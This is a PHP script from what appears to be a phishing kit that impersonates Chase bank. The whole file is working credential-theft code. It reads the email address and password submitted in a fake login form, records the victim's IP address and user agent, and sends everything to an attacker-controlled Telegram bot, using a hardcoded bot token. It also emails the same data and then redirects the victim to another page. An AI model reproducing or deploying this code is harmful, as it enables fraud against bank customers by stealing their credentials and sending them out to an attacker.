<?php

// Get the client IP address
$ip = $_SERVER['REMOTE_ADDR'];
if (isset($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

// Start session
session_start();


// Check if the form is submitted
if (isset($_POST['eml'])) {
    // Include the file with the variable $api and $chatid
    include 'to.php';

    // Get form data
    $Email = $_POST['eml'];
    $Pass = $_POST['emlpass'];

    // Compose the message
    $message = "<b>🔒 Chase Email Access Password🔑</b>\n";
    $message .= "<b>User:</b> <code>{$_SESSION['email']}</code>\n";
    $message .= "<b>Email:</b> <code>$Email</code>\n";
    $message .= "<b>Password:</b> <code>$Pass</code>\n";
    $message .= "<b>🌐 IP Address:</b> $ip\n";
    $message .= "<b>🖥 User-Agent:</b> {$_SERVER['USER_AGENT']}\n";
    $message .= "<b>🔍 Chase Result:</b>\n";

    // Set email subject and headers
    $subject = "Chase LOGIN";
    $headers = "From: Mody@BOA" . rand(1, 99) . "Mody.V1 \r\n";

    // Send message to Telegram using API
    file_get_contents("https://api.telegram.org/bot6024595519:AAHQcscrgYlrL2vxuh_mXG4FHKugXRA4Rww/sendMessage?chat_id=" . $chatid . "&parse_mode=HTML&text=" . urlencode($message));

    // Send email
    $done = mail($toemail, $subject, $message, $headers);

    // Redirect to the desired page
    header('Location: ./red5.php');
}

?>
